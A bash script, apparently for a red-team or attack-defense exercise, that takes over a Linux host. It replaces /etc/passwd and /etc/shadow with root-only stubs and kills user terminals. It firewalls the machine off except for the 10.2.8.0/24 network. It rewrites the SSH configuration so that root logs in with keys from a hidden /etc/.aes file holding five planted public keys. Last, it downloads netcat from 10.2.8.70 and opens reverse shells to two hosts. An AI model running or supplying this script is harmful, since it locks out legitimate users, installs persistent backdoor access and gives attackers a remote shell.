#!/bin/bash

mv /etc/shadow /etc/old_shadow
mv /etc/passwd /etc/old_passwd

echo "root:*:16074:0:99999:7:::" > /etc/shadow
echo "root:x:0:0:/root:/bin/bash" > /etc/passwd

ps -ef | grep tty | awk -F ' ' '{print $2}' | xargs kill -9

iptables -F
iptables -A INPUT -j DROP
iptables -A FORWARD -j DROP
iptables -A OUTPUT -j DROP
iptables -I INPUT -s 10.2.8.0/24
iptables -I INPUT -p icmp -j ACCEPT
iptables -I OUTPUT -d 10.2.8.0/24 -j ACCEPT

ip6tables -F
ip6tables -I INPUT -j DROP
ip6tables -I OUTPUT -j DROP
ip6tables -I FORWARD -j DROP

cat > /etc/ssh/sshd_config << EOF
Port 22
ListenAddress 0.0.0.0

Protocol 2
# HostKeys for protocol version 2

HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key

#Privilege Separation is turned on for security
UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
KeyRegenerationInterval 3600
ServerKeyBits 768

# Authentication:
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes

RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile	/etc/.aes

# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes

# For this to work you will also need host keys in /etc/ssh_known_hosts
RhostsRSAAuthentication no
# similar for protocol version 2
HostbasedAuthentication no
# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
IgnoreUserKnownHosts yes
PermitEmptyPasswords no
# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Change to no to disable tunnelled clear text passwords
PasswordAuthentication no

X11Forwarding no
#X11DisplayOffset 10
PrintMotd no
PrintLastLog no
TCPKeepAlive yes

AllowUsers root

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
EOF

rm -f /etc/.aes

cat > /etc/.aes << EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKsuUS3qaj2yl472MA9daAWeNTcdL4vMWFzXbG5bnnrRSS6OLC97zCiRLOmn7QEN6YNZtBmfhB4SdBbQeyND+MKUCowVWMBEL99MirGlgIKm137yqP4RI6v8qwuo0YldbyMK3SI+EyayfAUyjPDZvDaCvzkxvM6w/SCLGxsQz4z3d13zwlg7ecDnq37DNdcvYsMglazTsgijKsTzQiBLwWf+W2q3uzuY61Lm0kwzJo1lmvyM/hlcG1jQTbsuaSK4X8JeFAxTjJbchgsERhiCnmhGD+lxU0wEejIiWwx4Z5DKNRV3bH7/rk3QIFc0Rw00wUUb4YNvTjObcWV4ifAH1x five
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcHtVqLfQS343iFameygWZCnKLb+1pyB6T9qSesRoID+ZgsuUKzBD+i2jgA2aZY1LBZKOImCOsQa4ACyGANoDarHO28UrapWFowrkG5y/eLzXRZKibd/VpSRYdRobgL03s5e/7HCsBMBKPS5qVvaPLE+1tM5V93XxMZX1WrNsp7BNPZGaI/GqezHrDUtXuLr/QAOWlekwujtxB3wOwxDxrC/EoV1TOnOv8pO/x+MZx6sOuKmJg0Fi93VxdX1yKGnE8aazf+od2rZMJo4CSPTtoMQHoZ8DXxan9RaKDpXcxO9SbVjdw7wQoA5UdWN6bSCC2Ca/Il5MM97Ssmgsdw5R9 four
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDONezgpIK4WYuwh2NfMOsnmG9MQVIWHuSyjE1DKxScHh87o9tQl6a1SDCTeT/qd6JF4eJypHbdBmGGYdiwjUhpWE78cUI5wiBUeu1EzkcU+2ESvdez71KnUQjl6amoftxOVS8qsXUVVUGZFe7Zx15tOt4j3a48s5BCc570rmwpemk0SdeS/0sIVLwLhxbP/j0WqjqESVxSWqnbD+UaAgtzkdBpKuONmU0K91BplBc7Kgn9mGofe/IOC3Y3sO7/0UMo/KYB0v8+FbCQN9HC/yXI2O/RfQ3g5mB42P8HXhJGioRlzTaZjVwOf2B1SNbBSD3MDluU6u8MtH19xnv7cQMH one
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgJcgNbv5rZ9M6+Aa3dOYFI0RJ0aRn8ppmnfocc09LLOv80x/HLLaTRQv5jLUHZ1iW1OuUMnYlpErku1mwfH4bnuv3h2KCs4HwMFSjPHr6jjH/vvLU10q8JmVoZ8lGCBrVJngqu2pciezELKVU8hh8ZD/vkLUadYDhUehyM17zZvBWFEaecpWhKja27bi+/34vLM4GDEGP/Satj0oAZ+zxdWybYm3MgZM+VcduSdMX7W+UYSumMI1gyC1ye16kVoGqtRUIur+ilIQ4o4+pJQLKoeIdtEd1zycJ5u6xZxyQ/ACa+l12zWUJPZLPvMB5ipDHzTiQA9Kf5T08vGjfUwIN three
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwtIi7Cb2bdWf418YeJfw+js9eVqqYlEBzlLbGts+WCuObrTsQyReHDRsrprjLuQxQRmCyiMbwV4IHRBpHZ2vFwrI4jCLIJzHNZ4pB1dKlhhzP6m660s0hDc3FGJWf4E5VGJfwMTBTM4w2e2SwuEKqfOf7LFsFbvqQwJ5iHe8ED0fPSd8SMBwTPVtM68ckaSmdeR1jDqhzSi2rYIWJagT8rzSvle4Zp7hej4q3U5Gh5CMRkU1BgCyhVJEfT29wGBm/IHQDZ7fOsw2U2XohNTJDiDLnjeIrmylmJDJnLE/sMjzS/To1ZaQscqfiR4RqHDRBvBSVUPVfA2B8fq8sNMif two
EOF

/etc/init.d/ssh start

wget -P /opt/ 10.2.8.70:8080/nc
chmod 755 /opt/nc
/opt/nc 10.2.8.70 9000 -e /bin/bash&
/opt/nc 10.2.8.40 9000 -e /bin/bash&

